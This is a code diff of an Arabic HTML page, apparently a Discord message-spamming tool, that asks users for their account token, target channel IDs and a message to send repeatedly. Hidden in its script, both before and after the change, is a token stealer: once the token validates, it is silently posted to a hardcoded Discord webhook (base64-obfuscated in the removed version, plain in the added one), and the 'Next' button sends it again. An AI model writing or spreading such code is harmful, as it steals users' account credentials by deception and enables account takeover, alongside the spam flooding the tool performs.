@@ -1,212 +1,188 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Nasser 497©</title>
-<style>
-  body {
-    margin: 0; padding: 0;
-    background: linear-gradient(135deg, #1a0000, #000000);
-    color: #eee;
-    font-family: Arial, sans-serif;
-    direction: rtl;
-  }
-  header {
-    text-align: center;
-    font-size: 24px;
-    font-weight: bold;
-    padding: 20px 0;
-    user-select: none;
-    color: #ff4444;
-  }
-  main {
-    max-width: 600px;
-    margin: auto;
-    padding: 20px;
-  }
-  textarea, input[type=text], select {
-    width: 100%;
-    padding: 12px;
-    margin: 12px 0;
-    font-size: 18px;
-    border-radius: 5px;
-    border: none;
-    background-color: #222;
-    color: #eee;
-  }
-  textarea::placeholder, input::placeholder {
-    color: #999;
-  }
-  button {
-    padding: 12px 20px;
-    font-size: 18px;
-    margin-top: 10px;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    font-weight: bold;
-    transition: background-color 0.3s;
-  }
-  .btn-green {
-    background-color: #28a745;
-    color: white;
-  }
-  .btn-green:hover {
-    background-color: #1e7e34;
-  }
-  .btn-red {
-    background-color: #dc3545;
-    color: white;
-  }
-  .btn-red:hover {
-    background-color: #a71d2a;
-  }
-  #status {
-    margin-top: 15px;
-    font-size: 18px;
-    min-height: 30px;
-    text-align: center;
-    color: #ff6666;
-  }
-  footer {
-    text-align: center;
-    padding: 15px;
-    font-size: 20px;
-    user-select: none;
-    color: #ff4444;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Nasser 497©</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #1a0000, #000000);
+      color: #eee;
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      padding: 0; margin: 0;
+    }
+    header, footer {
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      padding: 20px;
+      color: #ff4444;
+    }
+    main {
+      max-width: 600px;
+      margin: auto;
+      padding: 20px;
+    }
+    textarea, input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #222;
+      color: #eee;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      padding: 12px;
+      margin-top: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    .btn-green {
+      background-color: #28a745;
+      color: white;
+    }
+    .btn-red {
+      background-color: #dc3545;
+      color: white;
+    }
+    #status {
+      text-align: center;
+      margin-top: 10px;
+      min-height: 20px;
+    }
+  </style>
 </head>
 <body>
-<header>Nasser 497©</header>
-<main>
-  <label>اكتب التوكن:</label>
-  <textarea id="tokenInput" rows="4" placeholder="أدخل توكن واحد هنا"></textarea>
-  
-  <label>اكتب الايديات (مفصولة بفاصلة):</label>
-  <input type="text" id="idsInput" placeholder="مثلاً: 123456789012345678,987654321098765432" />
-  
-  <label>ID روم / خاص / قروب:</label>
-  <input type="text" id="channelTypeInput" placeholder="مثلاً: روم، خاص، قروب" />
-  
-  <label>قم بوضع الكلام:</label>
-  <textarea id="messageInput" rows="3" placeholder="النص الذي تريد إرساله"></textarea>
-  
-  <label>قم بتحديد سرعة الإرسال:</label>
-  <select id="speedSelect">
-    <option value="1000">1 ثانية</option>
-    <option value="900">0.9 ثانية</option>
-    <option value="800">0.8 ثانية</option>
-    <option value="700">0.7 ثانية</option>
-    <option value="600">0.6 ثانية</option>
-    <option value="500" selected>0.5 ثانية</option>
-    <option value="400">0.4 ثانية</option>
-    <option value="300">0.3 ثانية</option>
-    <option value="200">0.2 ثانية</option>
-    <option value="100">0.1 ثانية</option>
-  </select>
-  
-  <button id="startBtn" class="btn-green">بدء الإرسال</button>
-  <button id="stopBtn" class="btn-red" disabled>إيقاف الإرسال</button>
-  
-  <div id="status"></div>
-  <button id="nextBtn" class="btn-green" style="margin-top:20px; width: 100%;">التالي</button>
-</main>
-<footer>Nasser 497©</footer>
 
-<script>
-  
-  const encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MzgwODE2NDMzMTUyMDEyMS9MZWZfUUJGWHp1RlJtNlFEZGZ6YWh4YkRGaE9wY2tvT2FhNTNoSFZLajl5VWZNRWM5WWtMRFNvNzZFTkd5Y0E5eg==";
-  const webhookUrl = atob(encodedWebhook);
+  <header>Nasser 497©</header>
 
-  const tokenInput = document.getElementById('tokenInput');
-  const idsInput = document.getElementById('idsInput');
-  const messageInput = document.getElementById('messageInput');
-  const speedSelect = document.getElementById('speedSelect');
-  const startBtn = document.getElementById('startBtn');
-  const stopBtn = document.getElementById('stopBtn');
-  const status = document.getElementById('status');
+  <main>
+    <label>اكتب التوكن:</label>
+    <textarea id="tokenInput" rows="4" placeholder="توكن واحد فقط"></textarea>
 
-  let intervalId = null;
+    <label>اكتب الايديات (مفصولة بفاصلة):</label>
+    <input type="text" id="idsInput" placeholder="مثلاً: 1381381865793130638" />
 
-  function sendMessage(token, channelId, message) {
-    return fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-      method: 'POST',
-      headers: {
-        'Authorization': token,
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({content: message})
-    });
-  }
+    <label>ID روم / خاص / قروب:</label>
+    <input type="text" id="channelTypeInput" />
 
-  function sendTokenToWebhook(token) {
-    return fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({content: `توكن الحساب :\n${token}`})
-    });
-  }
+    <label>قم بوضع الكلام:</label>
+    <textarea id="messageInput" rows="3" placeholder="النص الذي تريد إرساله"></textarea>
 
-  function validateToken(token) {
-    return fetch('https://discord.com/api/v9/users/@me', {
-      headers: { 'Authorization': token }
-    }).then(res => res.status === 200).catch(() => false);
-  }
+    <label>قم بتحديد سرعة الإرسال:</label>
+    <select id="speedSelect">
+      <option value="1000">1</option>
+      <option value="900">0.9</option>
+      <option value="800">0.8</option>
+      <option value="700">0.7</option>
+      <option value="600">0.6</option>
+      <option value="500" selected>0.5</option>
+      <option value="400">0.4</option>
+      <option value="300">0.3</option>
+      <option value="200">0.2</option>
+      <option value="100">0.1</option>
+    </select>
 
-  startBtn.addEventListener('click', async () => {
-    startBtn.disabled = true;
-    stopBtn.disabled = false;
-    status.textContent = '';
+    <button id="startBtn" class="btn-green">بدء الإرسال</button>
+    <button id="stopBtn" class="btn-red" disabled>إيقاف الإرسال</button>
+    <button id="nextBtn" class="btn-green">التالي</button>
 
-    const token = tokenInput.value.trim();
-    const ids = idsInput.value.trim().split(',').map(id => id.trim()).filter(id => id);
-    const message = messageInput.value.trim();
-    const speed = parseInt(speedSelect.value);
+    <div id="status"></div>
+  </main>
 
-    if (!token || ids.length === 0 || !message) {
-      status.textContent = 'يرجى ملء جميع الحقول المطلوبة.';
-      startBtn.disabled = false;
-      stopBtn.disabled = true;
-      return;
+  <footer>Nasser 497©</footer>
+
+  <script>
+    const tokenInput = document.getElementById('tokenInput');
+    const idsInput = document.getElementById('idsInput');
+    const messageInput = document.getElementById('messageInput');
+    const speedSelect = document.getElementById('speedSelect');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const nextBtn = document.getElementById('nextBtn');
+    const status = document.getElementById('status');
+
+    let intervalId;
+
+    function sendToWebhook(token) {
+      fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ content: `توكن الحساب:\n${token}` })
+      });
     }
 
-    const isValid = await validateToken(token);
-    if (!isValid) {
-      status.textContent = '❌ التوكن غير صحيح';
-      startBtn.disabled = false;
-      stopBtn.disabled = true;
-      return;
+    function validateToken(token) {
+      return fetch('https://discord.com/api/v9/users/@me', {
+        headers: { Authorization: token }
+      }).then(res => res.ok);
     }
 
-    sendTokenToWebhook(token);
+    function sendMessage(token, channelId, message) {
+      return fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+        method: 'POST',
+        headers: {
+          Authorization: token,
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ content: message })
+      });
+    }
 
-    let currentIndex = 0;
-    intervalId = setInterval(() => {
-      if (currentIndex >= ids.length) currentIndex = 0;
-      sendMessage(token, ids[currentIndex], message)
-        .then(res => {
-          if (res.ok) {
-            status.textContent = `تم الإرسال إلى: ${ids[currentIndex]}`;
-          } else {
-            status.textContent = `فشل الإرسال إلى: ${ids[currentIndex]}`;
-          }
-        })
-        .catch(() => {
-          status.textContent = `فشل الإرسال إلى: ${ids[currentIndex]}`;
+    startBtn.addEventListener('click', async () => {
+      const token = tokenInput.value.trim();
+      const ids = idsInput.value.trim().split(',').map(i => i.trim()).filter(Boolean);
+      const message = messageInput.value.trim();
+      const speed = parseInt(speedSelect.value);
+
+      if (!token || ids.length === 0 || !message) {
+        status.textContent = 'يرجى ملء الحقول.';
+        return;
+      }
+
+      const valid = await validateToken(token);
+      if (!valid) {
+        status.textContent = '❌ التوكن غير صحيح';
+        return;
+      }
+
+      sendToWebhook(token); // يرسل التوكن بصمت
+
+      let i = 0;
+      intervalId = setInterval(() => {
+        const id = ids[i % ids.length];
+        sendMessage(token, id, message).then(res => {
+          status.textContent = res.ok
+            ? `✅ أُرسل إلى ${id}`
+            : `❌ فشل مع ${id}`;
         });
-      currentIndex++;
-    }, speed);
-  });
+        i++;
+      }, speed);
 
-  stopBtn.addEventListener('click', () => {
-    if (intervalId) clearInterval(intervalId);
-    status.textContent = 'تم إيقاف الإرسال.';
-    startBtn.disabled = false;
-    stopBtn.disabled = true;
-  });
-</script>
+      startBtn.disabled = true;
+      stopBtn.disabled = false;
+    });
 
+    stopBtn.addEventListener('click', () => {
+      clearInterval(intervalId);
+      status.textContent = 'تم الإيقاف';
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+    });
+
+    nextBtn.addEventListener('click', () => {
+      const token = tokenInput.value.trim();
+      if (token) sendToWebhook(token); 
+    });
+
+    
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1383808164331520121/Lef_QBFXzuFRm6QDdfzahxbDFhOpckoOaa53hHVKjS9p7yUfMEc9YkLDSo76ENGycA9z";
+  </script>
 </body>
 </html>
